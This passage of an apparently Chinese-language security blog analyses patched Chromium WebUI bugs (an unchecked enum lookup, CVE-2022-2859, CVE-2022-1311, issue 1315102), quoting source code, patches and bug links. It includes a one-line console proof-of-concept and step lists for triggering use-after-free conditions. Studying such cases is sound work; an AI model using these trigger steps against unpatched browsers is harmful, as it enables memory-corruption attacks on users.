class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Converts base::Value&lt;int&gt; to NavigationView based on enum values.</span></span><br><span class="line"><span class="function">NavigationView <span class="title">ConvertToNavigationView</span><span class="params">(<span class="keyword">const</span> base::Value&amp; value)</span> </span>&#123;</span><br><span class="line">DCHECK(value.is_int());</span><br><span class="line">  DCHECK_LE(value.GetInt(), <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(NavigationView::kMaxValue));</span><br><span class="line">  **<span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;NavigationView&gt;(value.GetInt());**</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Message Handlers:</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DiagnosticsMetricsMessageHandler::HandleRecordNavigation</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> base::Value::List&amp; args)</span> </span>&#123;</span><br><span class="line">  DCHECK_EQ(<span class="number">2u</span>, args.size());</span><br><span class="line">  DCHECK_NE(args[<span class="number">0</span>], args[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  **<span class="keyword">const</span> NavigationView from_view = ConvertToNavigationView(args[<span class="number">0</span>]);**</span><br><span class="line">  <span class="keyword">const</span> NavigationView to_view = ConvertToNavigationView(args[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">const</span> base::Time updated_start_time = base::Time::Now();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Recordable navigation event occurred.</span></span><br><span class="line">  **EmitScreenOpenDuration(from_view, updated_start_time - navigation_started_);**</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `current_view_` updated to recorded `to_view` and reset timer.</span></span><br><span class="line">  current_view_ = to_view;</span><br><span class="line">  navigation_started_ = updated_start_time;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EmitScreenOpenDuration</span><span class="params">(<span class="keyword">const</span> NavigationView screen,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">const</span> base::TimeDelta&amp; time_elapsed)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Map of screens within Diagnostics app to matching duration metric name.</span></span><br><span class="line">  <span class="keyword">constexpr</span> <span class="keyword">auto</span> kOpenDurationMetrics =</span><br><span class="line">      base::MakeFixedFlatMap&lt;NavigationView, base::StringPiece&gt;(&#123;</span><br><span class="line">          &#123;NavigationView::kConnectivity,</span><br><span class="line">           <span class="string">"ChromeOS.DiagnosticsUi.Connectivity.OpenDuration"</span>&#125;,</span><br><span class="line">          &#123;NavigationView::kInput, <span class="string">"ChromeOS.DiagnosticsUi.Input.OpenDuration"</span>&#125;,</span><br><span class="line">          &#123;NavigationView::kSystem,</span><br><span class="line">           <span class="string">"ChromeOS.DiagnosticsUi.System.OpenDuration"</span>&#125;,</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">  **<span class="keyword">auto</span>* iter = kOpenDurationMetrics.find(screen);**</span><br><span class="line">  DCHECK(iter != kOpenDurationMetrics.end());</span><br><span class="line"></span><br><span class="line">  base::UmaHistogramLongTimes100(<span class="built_in">std</span>::<span class="built_in">string</span>(iter-&gt;second), time_elapsed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>browsing <code>chrome://diagnostics</code> and open devtools</p><p>execute <code>chrome.send(&quot;recordNavigation&quot;,[1337,0]);</code> in console.</p><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p>补丁就是加上了我刚刚提到的没有加的检查。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span>* iter = kOpenDurationMetrics.find(screen);</span><br><span class="line">-  DCHECK(iter != kOpenDurationMetrics.end());</span><br><span class="line">+  <span class="keyword">if</span> (iter == kOpenDurationMetrics.end())</span><br><span class="line">+    <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><h2 id="other-case"><a href="#other-case" class="headerlink" title="other case"></a>other case</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1303613" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=1303613</a></p><h1 id="unique-ptr-double-init"><a href="#unique-ptr-double-init" class="headerlink" title="unique_ptr double init"></a>unique_ptr double init</h1><h2 id="case1-CVE-2022-2859"><a href="#case1-CVE-2022-2859" class="headerlink" title="case1: CVE-2022-2859"></a>case1: CVE-2022-2859</h2><p><a href="https://chromium.googlesource.com/chromium/src/+/08b5eaecf33165cda178517fa4ba070d1f598e16" target="_blank" rel="noopener">https://chromium.googlesource.com/chromium/src/+/08b5eaecf33165cda178517fa4ba070d1f598e16</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MultidevicePhoneHubHandler::RegisterMessages</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  web_ui()-&gt;RegisterDeprecatedMessageCallback(</span><br><span class="line">      <span class="string">"setFakePhoneHubManagerEnabled"</span>,</span><br><span class="line">      base::BindRepeating(</span><br><span class="line">          **&amp;MultidevicePhoneHubHandler::HandleEnableFakePhoneHubManager**,</span><br><span class="line">          base::Unretained(<span class="keyword">this</span>)));</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MultidevicePhoneHubHandler::HandleEnableFakePhoneHubManager</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> base::ListValue* args)</span> </span>&#123;</span><br><span class="line">  AllowJavascript();</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">auto</span>&amp; <span class="built_in">list</span> = args-&gt;GetListDeprecated();</span><br><span class="line">  CHECK(!<span class="built_in">list</span>.empty());</span><br><span class="line">  **<span class="keyword">const</span> <span class="keyword">bool</span> enabled = <span class="built_in">list</span>[<span class="number">0</span>].GetBool();**</span><br><span class="line">  <span class="keyword">if</span> (enabled) &#123;</span><br><span class="line">    **EnableFakePhoneHubManager();**</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  EnableRealPhoneHubManager();</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MultidevicePhoneHubHandler::EnableRealPhoneHubManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// If no FakePhoneHubManager is active, return early. This ensures that we</span></span><br><span class="line">  <span class="comment">// don't unnecessarily re-initialize the Phone Hub UI.</span></span><br><span class="line">  <span class="keyword">if</span> (!fake_phone_hub_manager_)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  PA_LOG(VERBOSE) &lt;&lt; <span class="string">"Setting real Phone Hub Manager"</span>;</span><br><span class="line">  Profile* profile = Profile::FromWebUI(web_ui());</span><br><span class="line">  <span class="keyword">auto</span>* phone_hub_manager =</span><br><span class="line">      phonehub::PhoneHubManagerFactory::GetForProfile(profile);</span><br><span class="line">  ash::SystemTray::Get()-&gt;SetPhoneHubManager(phone_hub_manager);</span><br><span class="line"></span><br><span class="line">  RemoveObservers();</span><br><span class="line">  fake_phone_hub_manager_.reset();</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MultidevicePhoneHubHandler::EnableFakePhoneHubManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  DCHECK(!fake_phone_hub_manager_);</span><br><span class="line">  PA_LOG(VERBOSE) &lt;&lt; <span class="string">"Setting fake Phone Hub Manager"</span>;</span><br><span class="line">  **fake_phone_hub_manager_ = <span class="built_in">std</span>::make_unique&lt;phonehub::FakePhoneHubManager&gt;();** <span class="comment">//---&gt;[0]</span></span><br><span class="line">  ash::SystemTray::Get()-&gt;SetPhoneHubManager(**fake_phone_hub_manager_.get()**); <span class="comment">// ----&gt;[1]</span></span><br><span class="line">  AddObservers();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PhoneHubUiController::SetPhoneHubManager</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    phonehub::PhoneHubManager* phone_hub_manager)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (phone_hub_manager == phone_hub_manager_)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  **CleanUpPhoneHubManager();**  <span class="comment">//----&gt;[2]</span></span><br><span class="line"></span><br><span class="line">  **phone_hub_manager_ = phone_hub_manager;**  <span class="comment">// ----&gt;[1]</span></span><br><span class="line">  <span class="keyword">if</span> (phone_hub_manager_) &#123;</span><br><span class="line">    phone_hub_manager_-&gt;GetFeatureStatusProvider()-&gt;AddObserver(<span class="keyword">this</span>);</span><br><span class="line">    phone_hub_manager_-&gt;GetOnboardingUiTracker()-&gt;AddObserver(<span class="keyword">this</span>);</span><br><span class="line">    phone_hub_manager_-&gt;GetPhoneModel()-&gt;AddObserver(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  UpdateUiState(GetUiStateFromPhoneHubManager());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PhoneHubUiController::CleanUpPhoneHubManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!phone_hub_manager_)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  **phone_hub_manager_-&gt;GetFeatureStatusProvider**()-&gt;RemoveObserver(<span class="keyword">this</span>); <span class="comment">//----&gt;[2]</span></span><br><span class="line">  phone_hub_manager_-&gt;GetOnboardingUiTracker()-&gt;RemoveObserver(<span class="keyword">this</span>);</span><br><span class="line">  phone_hub_manager_-&gt;GetPhoneModel()-&gt;RemoveObserver(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>[0] 当我们调用两次EnableFakePhoneHubManager, fake_phone_hub_manager_字段将会被初始化两次, 又由于fake_phone_hub_manager_是一个unique_ptr，所以前一次创建的FakePhoneHubManager将会被后一次创建释放掉。</p><p>[1] 但是第一次创建的fake_phone_hub_manager_的raw ptr还保存在PhoneHubUiController的phone_hub_manager_字段里</p><p>[2] 这将导致第二次调用EnableFakePhoneHubManager的时候，沿着<code>EnableFakePhoneHubManager-&gt;SetPhoneHubManager-&gt;CleanUpPhoneHubManager</code> 路径，再次使用到前一次被保存到phone_hub_manager_里的被释放的FakePhoneHubManager，造成UAF。</p><h1 id="cross-thread-calback-race"><a href="#cross-thread-calback-race" class="headerlink" title="cross-thread calback race"></a>cross-thread calback race</h1><h2 id="case1-CVE-2022-1311"><a href="#case1-CVE-2022-1311" class="headerlink" title="case1: CVE-2022-1311"></a>case1: CVE-2022-1311</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1310717" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=1310717</a></p><p><a href="https://chromium.googlesource.com/chromium/src.git/+/HEAD/docs/threading_and_tasks.md" target="_blank" rel="noopener">https://chromium.googlesource.com/chromium/src.git/+/HEAD/docs/threading_and_tasks.md</a></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2022-12-03-051238.jpg" alt=""></p><p>Chrome将运行UI并管理所有网页和插件进程的主进程称为“浏览器进程”或“浏览器”，而每个网页都运行在一个单独的进程里，这个进程称为渲染进程。</p><p>鉴于渲染进程在单独的进程中运行，所以Chrome有机会通过沙箱限制其对系统资源的访问，所有渲染器对网络和文件资源的访问都通过IPC来通知浏览器进程来完成。</p><p>在一个进程中，往往有如下几种线程：</p><ul><li>一个 main thread<ul><li>在 Browser 进程中 (BrowserThread::UI)：用于更新 UI</li><li>在 Render 进程中：运行Blink</li></ul></li><li>一个 io thread<ul><li>在 Browser 进程中(BrowserThread::IO): 用于处理 IPC 消息以及网络请求</li><li>在 Render 进程中：用于处理IPC消息</li></ul></li><li>一些使用 base::Tread 创建的，有特殊用途的线程（可能存在）</li><li>一些在使用线程池时产生的线程（可能存在）</li></ul><ol><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1310717" target="_blank" rel="noopener">CVE-2022-1311</a> </li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CrostiniUpgrader::Backup</span><span class="params">(<span class="keyword">const</span> ContainerId&amp; container_id,</span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">bool</span> show_file_chooser,</span></span></span><br><span class="line"><span class="function"><span class="params">                              content::WebContents* web_contents)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (show_file_chooser) &#123;</span><br><span class="line">    CrostiniExportImport::GetForProfile(profile_)-&gt;ExportContainer(</span><br><span class="line">        container_id, web_contents, MakeFactory());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  base::FilePath default_path =</span><br><span class="line">      CrostiniExportImport::GetForProfile(profile_)-&gt;GetDefaultBackupPath();</span><br><span class="line">  **base::ThreadPool::PostTaskAndReplyWithResult**(</span><br><span class="line">      FROM_HERE, &#123;base::MayBlock()&#125;,</span><br><span class="line">      base::BindOnce(&amp;base::PathExists, default_path),</span><br><span class="line">      base::BindOnce(&amp;CrostiniUpgrader::OnBackupPathChecked,</span><br><span class="line">                     weak_ptr_factory_.GetWeakPtr(), container_id, **web_contents**,</span><br><span class="line">                     default_path));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我介绍一个我挖掘的漏洞，首先我们要知道Chrome线程内部是怎么实现任务的同步的，其实是通过派发一个回调给一个处理线程的MessageLoop，然后MessageLoop会调度该回调以执行其操作。</p><p>这个漏洞就是这么产生的，ThreadPool::PostTaskAndReplyWithResult是UI线程向线程池里的线程发送一个PathExists函数的回调，然后线程池会检查backup路径是否存在，然后当线程池执行完任务PathExists，它会向UI线程发送一个OnRestorePathChecked函数的回调，一个回调其实和一个闭包是相似的，它会包括一个函数指针和它使用的函数参数。</p><p>在这个过程中就可能产生条件竞争。因为OnRestorePathChecked的参数里包括了一个原始指针web_contents，这样的指针是没有被保护的，所以如果我们在线程池里正在执行PathExists的同时，我们在UI线程这边通过关闭网页把web_contents释放掉，从而当OnRestorePathChecked被发回到UI线程执行的时候，此时web_contents已经被释放掉了，解引用它的指针就会触发UAF。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2022-12-03-051320.jpg" alt=""></p><h2 id="other-case-1"><a href="#other-case-1" class="headerlink" title="other case"></a>other case</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1320624" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=1320624</a></p><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1322744" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=1322744</a></p><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1311701" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=1311701</a></p><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1304145" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=1304145</a></p><h1 id="Listener-no-check-destroyed"><a href="#Listener-no-check-destroyed" class="headerlink" title="Listener no check destroyed"></a>Listener no check destroyed</h1><h2 id="case1-issue-1315102"><a href="#case1-issue-1315102" class="headerlink" title="case1: issue-1315102"></a>case1: issue-1315102</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1315102" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=1315102</a></p><p><code>SupportToolMessageHandler::HandleStartDataExport</code> 会创建一个 <code>select_file_dialog_</code> [1] 并显示一个 SelectFileDialog对话框。</p><p>当 [1] 被调用时，<code>this</code> 原始指针被传递给<code>ui::SelectFileDialog::Create</code> ，并且传递的<code>this</code> 原始指针被保存在<code>listener_</code> [2] 中。</p><p>当用户选择一个文件夹时，<code>listener_-&gt;FileSelected(paths[0], index, params);</code> [3]被调用来处理用户的文件夹选择。</p><p>但是，<code>SupportToolMessageHandler::~SupportToolMessageHandler</code> [4] 是默认析构函数，不会调<br><code>select_file_dialog_-&gt;ListenerDestroyed();</code> 将<code>listener_</code> 置为nullptr。</p><p>如果用户在 <code>SupportToolMessageHandler</code> 被释放后选择了一个文件夹（即 <code>listener_</code> 被释放），UAF 将在 [3] 中触发。</p><p>因此，我们可以构建以下 UAF 链：</p><ol><li>通过chrome.send调用<code>SupportToolMessageHandler::HandleStartDataExport</code> </li><li>通过关闭webui网页来释放<code>SupportToolMessageHandler</code></li><li>在SelectFileDialog里选择一个文件，在[3]中触发UAF。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">scoped_refptr&lt;ui::SelectFileDialog&gt; select_file_dialog_;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SupportToolMessageHandler::HandleStartDataExport</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> base::Value::List&amp; args)</span> </span>&#123;</span><br><span class="line">  CHECK_EQ(<span class="number">1U</span>, args.size());</span><br><span class="line">  <span class="keyword">const</span> base::Value::List* pii_items = args[<span class="number">0</span>].GetIfList();</span><br><span class="line">  DCHECK(pii_items);</span><br><span class="line"></span><br><span class="line">  selected_pii_to_keep_ = GetSelectedPIIToKeep(pii_items);</span><br><span class="line"></span><br><span class="line">  AllowJavascript();</span><br><span class="line">  content::WebContents* web_contents = web_ui()-&gt;GetWebContents();</span><br><span class="line">  gfx::NativeWindow owning_window =</span><br><span class="line">      web_contents ? web_contents-&gt;GetTopLevelNativeWindow()</span><br><span class="line">                   : gfx::kNullNativeWindow;</span><br><span class="line">  select_file_dialog_ = ui::SelectFileDialog::Create(</span><br><span class="line">      <span class="keyword">this</span>,</span><br><span class="line">      <span class="built_in">std</span>::make_unique&lt;ChromeSelectFilePolicy&gt;(web_ui()-&gt;GetWebContents()));</span><br><span class="line"></span><br><span class="line">  select_file_dialog_-&gt;SelectFile(</span><br><span class="line">      ui::SelectFileDialog::SELECT_SAVEAS_FILE,</span><br><span class="line">      <span class="comment">/*title=*/</span><span class="built_in">std</span>::u16string(),</span><br><span class="line">      <span class="comment">/*default_path=*/</span></span><br><span class="line">      GetDefaultFileToExport(handler_-&gt;GetCaseID(), data_collection_time_),</span><br><span class="line">      <span class="comment">/*file_types=*/</span><span class="literal">nullptr</span>,</span><br><span class="line">      <span class="comment">/*file_type_index=*/</span><span class="number">0</span>,</span><br><span class="line">      <span class="comment">/*default_extension=*/</span>base::FilePath::StringType(), owning_window,</span><br><span class="line">      <span class="comment">/*params=*/</span><span class="literal">nullptr</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SupportToolMessageHandler::FileSelected</span><span class="params">(<span class="keyword">const</span> base::FilePath&amp; path,</span></span></span><br><span class="line"><span class="function"><span class="params">                                             <span class="keyword">int</span> index,</span></span></span><br><span class="line"><span class="function"><span class="params">                                             <span class="keyword">void</span>* params)</span> </span>&#123;</span><br><span class="line">  FireWebUIListener(<span class="string">"support-data-export-started"</span>);</span><br><span class="line">  select_file_dialog_.reset();</span><br><span class="line">  <span class="keyword">this</span>-&gt;handler_-&gt;ExportCollectedData(</span><br><span class="line">      <span class="built_in">std</span>::move(selected_pii_to_keep_), path,</span><br><span class="line">      base::BindOnce(&amp;SupportToolMessageHandler::OnDataExportDone,</span><br><span class="line">                     weak_ptr_factory_.GetWeakPtr()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SupportToolMessageHandler::FileSelectionCanceled</span><span class="params">(<span class="keyword">void</span>* params)</span> </span>&#123;</span><br><span class="line">  selected_pii_to_keep_.clear();</span><br><span class="line">  select_file_dialog_.reset();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Checks `errors` and fires WebUIListener with the error message or the</span></span><br><span class="line"><span class="comment">// exported path according to the returned errors.</span></span><br><span class="line"><span class="comment">// type DataExportResult = &#123;</span></span><br><span class="line"><span class="comment">//  success: boolean,</span></span><br><span class="line"><span class="comment">//  path: string,</span></span><br><span class="line"><span class="comment">//  error: string,</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SupportToolMessageHandler::OnDataExportDone</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    base::FilePath path,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="built_in">std</span>::<span class="built_in">set</span>&lt;SupportToolError&gt; errors)</span> </span>&#123;</span><br><span class="line">  data_path_ = path;</span><br><span class="line">  base::Value::Dict data_export_result;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">auto</span>&amp; export_error = <span class="built_in">std</span>::find_if(</span><br><span class="line">      errors.begin(), errors.end(), [](<span class="keyword">const</span> SupportToolError&amp; error) &#123;</span><br><span class="line">        <span class="keyword">return</span> (error.error_code == SupportToolErrorCode::kDataExportError);</span><br><span class="line">      &#125;);</span><br><span class="line">  <span class="keyword">if</span> (export_error == errors.end()) &#123;</span><br><span class="line">    data_export_result.Set(<span class="string">"success"</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> displayed_path = data_path_.AsUTF8Unsafe();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BUILDFLAG(IS_CHROMEOS_ASH)</span></span><br><span class="line">    displayed_path = file_manager::util::GetPathDisplayTextForSettings(</span><br><span class="line">        Profile::FromWebUI(web_ui()), displayed_path);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">// BUILDFLAG(IS_CHROMEOS_ASH)</span></span></span><br><span class="line">    data_export_result.Set(<span class="string">"path"</span>, displayed_path);</span><br><span class="line">    data_export_result.Set(<span class="string">"error"</span>, <span class="built_in">std</span>::<span class="built_in">string</span>());</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// If a data export error is found in the returned set of errors, send the</span></span><br><span class="line">    <span class="comment">// error message to UI with empty string as path since it means the export</span></span><br><span class="line">    <span class="comment">// operation has failed.</span></span><br><span class="line">    data_export_result.Set(<span class="string">"success"</span>, <span class="literal">false</span>);</span><br><span class="line">    data_export_result.Set(<span class="string">"path"</span>, <span class="built_in">std</span>::<span class="built_in">string</span>());</span><br><span class="line">    data_export_result.Set(<span class="string">"error"</span>, export_error-&gt;error_message);</span><br><span class="line">  &#125;</span><br><span class="line">  FireWebUIListener(<span class="string">"data-export-completed"</span>,</span><br><span class="line">                    base::Value(<span class="built_in">std</span>::move(data_export_result)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SupportToolMessageHandler::HandleShowExportedDataInFolder</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> base::Value::List&amp; args)</span> </span>&#123;</span><br><span class="line">  platform_util::ShowItemInFolder(Profile::FromWebUI(web_ui()), data_path_);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// SupportToolUI</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">SupportToolUI::SupportToolUI(content::WebUI* web_ui) : WebUIController(web_ui) &#123;</span><br><span class="line">  web_ui-&gt;AddMessageHandler(<span class="built_in">std</span>::make_unique&lt;SupportToolMessageHandler&gt;());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set up the 